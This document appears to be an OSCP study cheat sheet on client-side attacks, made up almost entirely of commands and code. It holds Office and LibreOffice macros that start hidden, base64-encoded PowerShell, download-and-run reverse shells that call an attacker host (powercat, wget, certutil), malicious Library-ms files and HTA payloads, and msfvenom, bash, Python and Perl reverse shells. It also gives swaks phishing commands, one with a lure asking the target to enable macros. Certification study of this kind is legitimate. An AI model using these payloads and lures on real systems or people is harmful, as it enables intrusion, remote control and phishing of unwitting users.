---
title: "OSCP · Attaques côté client"
description: "Comprendre les vecteurs d'interaction avec les postes utilisateurs."
---

# OSCP · Attaques côté client

Comprendre les vecteurs d'interaction avec les postes utilisateurs.


## MACROS

Commandes, paramètres et exemples associés à cette technique.


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "[Your PowerShell Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


```powershell
IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
```


```powershell
$text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
Write-Output $encoded
```


```python
cmd_str = "[Your Base64 Encoded PowerShell Command]"

chunk_size = 50

for i in range(0, len(cmd_str), chunk_size):
    print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
```


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim encodedCmd As String

    encodedCmd = encodedCmd + "[Base64 Chunk 1]"
    encodedCmd = encodedCmd + "[Base64 Chunk 2]"
    encodedCmd = encodedCmd + "..."
    encodedCmd = encodedCmd + "[Base64 Chunk N]"

    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
End Sub
```


## Windows Library Files

Observer les permissions et la configuration de Windows.


```bash
wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
```


```powershell
# Create the file as a shortcut in the Windows system to prepare the attack
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
```


```text
.Library-ms
```


```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>[http://your-server]</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```


## Advanced Exploitation

Commandes, paramètres et exemples associés à cette technique.


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "powe" & "rshe" & "ll.exe"
    cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmdStr As String
    cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
    CreateObject("Wscript.Shell").Run cmdStr
End Sub
```


```powershell
# Using Encodings
$text = "[Your PowerShell Command]"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
Write-Output $encoded

# Altering PowerShell Execution Policies
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand [Your Base64 Encoded Command]
```


```html
<script>
    var cmd = "[Your JavaScript Command]";
    eval(cmd);
</script>
```


```javascript
var cmd = "";
cmd += "var shell = new ActiveXObject('WScript.Shell');";
cmd += "shell.Run('cmd.exe /c powershell.exe -nop -w hidden -enc [Base64 Encoded Command]');";
eval(cmd);
```


```powershell
net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
```


## Send Emails

Commandes, paramètres et exemples associés à cette technique.


### Normal Email

Commandes, paramètres et exemples associés à cette technique.


```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "Subject: [email-subject]" --suppress-data
```


```text
-t
```


```text
--from
```


```text
--attach
```


```text
--server
```


```text
--body
```


```text
--header
```


```text
--suppress-data
```


### Email with Authentication

Commandes, paramètres et exemples associés à cette technique.


```bash
sudo swaks -t <recipient@example.com> --from <sender@example.com> \
--attach config.Library-ms --server <SMTP_SERVER> --body body.txt \
--header "Subject: Problems" --suppress-data \
--auth LOGIN --auth-user <username> --auth-password <password>
```


```text
--auth LOGIN
```


```text
--auth-user
```


```text
--auth-password
```


### Email with Custom Headers for Social Engineering

Commandes, paramètres et exemples associés à cette technique.


```bash
sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
--server [smtp-server-ip] --body [email-body.txt] \
--header "X-Priority: 1 (Highest)" --header "Importance: High" --suppress-data
```


```text
X-Priority
```


```text
Importance
```


### Alternative Tool sendemail

Commandes, paramètres et exemples associés à cette technique.


```bash
sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
-u '[subject]' -m '[message]' -a '[attachment]'
```


```text
sendemail
```


```text
-f
```


```text
-t
```


```text
-s
```


```text
192.168.203.140:25
```


```text
-u
```


```text
-m
```


```text
-a
```


### Comparison Summary

Commandes, paramètres et exemples associés à cette technique.


**Authentication**

No · Yes · No · No


**Custom Headers**

Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only


**SMTP Authentication**

No · Yes · No · No


**Social Engineering Usage**

No · No · Yes (with custom headers) · No


**Tool Complexity**

Moderate · Moderate · Moderate · Simple


## Exploiting LibreOffice Macros for Payload Execution

Commandes, paramètres et exemples associés à cette technique.


### Cibles Linux

Examiner les permissions et la configuration de Linux.


```bash
echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh

# Alternatively, use msfvenom to create an ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf

# If the target machine allows Bash scripts to execute
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh

# Useful if Python is available on the target
msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py

# Alternative Python Reverse Shell Payload
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

# Alternative Perl Reverse Shell Payload
echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl
```


```text
-f elf
```


```text
-o shell.elf
```


```text
shell.elf
```


```text
Sub RunShell
    Shell("/bin/bash -c 'wget http://<your_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
End Sub

- Shell: Executes the Bash command.  
- wget: Downloads the payload from your web server.  
- chmod +x: Makes the script executable.  
- /tmp/shell.sh: Runs the script from /tmp.
```


```bash
python3 -m http.server 80
```


```sql
update.odt
```


```bash
nc -lvnp 4444
```


```text
swaks
```


```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach update.odt --header "Subject: Important Update" \
--body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"

# Execution Flow:
# 1. Target opens the LibreOffice document.
# 2. When the target enables macros, the payload is downloaded and executed.
# 3. A reverse shell connects to your Netcat listener.
```


### Cibles Windows

Observer les permissions et la configuration de Windows.


```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
```


```text
-f hta-psh
```


```text
-o evil.hta
```


```text
evil.hta
```


```text
evil.hta
```


```text
.hta
```


```bash
msfvenom
```


```text
ps1
```


```text
exe
```


```text
-f exe -o evil.exe
```


```text
vbs
```


```text
-f vbs -o evil.vbs
```


```text
ps1
```


```text
-f ps1 -o script.ps1
```


```text
dll
```


```text
-f dll -o payload.dll
```


```text
evil.hta
```


```python
# Python script to split the payload into 50-character chunks
s = "<PASTE_PAYLOAD_HERE>"  # Replace with your payload string
n = 50  # Chunk size

for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```


```text
exploit.ods
```


```text
Tools
```


```text
Options
```


```text
LibreOffice
```


```text
Security
```


```text
Macro Security
```


```text
Tools
```


```text
Macros
```


```text
Organize Macros
```


```text
LibreOffice Basic
```


```text
Exploit
```


```text
REM ***** BASIC *****
Sub Exploit
    Dim Str As String
    ' Add payload chunks here
    Str = Str + "powershell.exe -nop -w hidden -e "
    Str = Str + "<INSERT_YOUR_PAYLOAD_CHUNKS>"
    
    ' Execute the payload using Shell
    Shell Str, 1
End Sub
```


```text
<INSERT_YOUR_PAYLOAD_CHUNKS>
```


```text
-nop
```


```text
-w hidden
```


```text
Shell
```


```text
Shell Str, 1
```


```text
Shell(Str)
```


```text
Shell Str, 1
```


```text
Shell
```


```bash
nc -lvnp 444
```


```bash
swaks --to target@example.com --from emmanuel@example.com \
--server smtp.example.com:587 --auth LOGIN \
--auth-user emmanuel@example.com --auth-password 'your_password' \
--attach evil.hta --header "Subject: Important Document" \
--body "Hi,\n\nPlease find the attached document.\n\nBest regards,\nEmmanuel"
```


```text
exploit.ods
```


```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


```bash
systeminfo
whoami
ipconfig /all
```


```text
cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
```


---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
